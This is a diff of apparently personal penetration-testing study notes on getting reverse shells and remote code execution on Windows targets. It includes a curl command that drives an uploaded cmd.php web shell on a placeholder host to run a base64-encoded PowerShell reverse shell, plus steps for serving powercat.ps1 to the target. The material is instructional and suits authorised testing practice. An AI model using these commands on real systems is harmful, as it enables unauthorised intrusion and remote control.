@@ -32,7 +32,7 @@ export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
 2-2-1.https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 2-2-2.Kali-/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
 2-2-3.We need to notice one thing:
-The Windows malicious reverse shell command sometimes should be encoded with 'UTF-16LE (1200)' and 'BASE-64'.
+The Windows malicious reverse powershell shell command sometimes should be encoded with 'UTF-16LE (1200)' and 'BASE-64'.
 
 2-3.Another resources for the malicious reverse shell command we could refer:
 https://www.revshells.com/
@@ -48,9 +48,11 @@ If the target is web server, we could do LFi way to fulfill RCE attack.There are
 A.curl RCE:
 Step1.Uploading the executable file to the target server.
 Step2.After uploading, we do below command:
-curl http://abc.com/uploads/cmd.php --data-urlencode 'cmd=powershell+-e+{Windows-reverse shell command with "UTF-16LE (1200)" and "BASE-64"}'
+curl http://abc.com/uploads/cmd.php --data-urlencode 'cmd=powershell+-e+{Windows-reverse powershell shell command with "UTF-16LE (1200)" and "BASE-64"}'
 Step3.Then,u could get the Windows shell on the target.
-B.Kali-powercat.ps1:
+B.Burpsuite RCE:
+You also use Burpsuite tool to do RCE.(Please check DB part!)
+C.Kali-powercat.ps1:
 Step1.First,we copy /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 to /home/kali in Kali.
 Step2.After copying,we trigger HTTP shared service and pass this script to the target.
 Step3.Then,we do below command on our browser client:
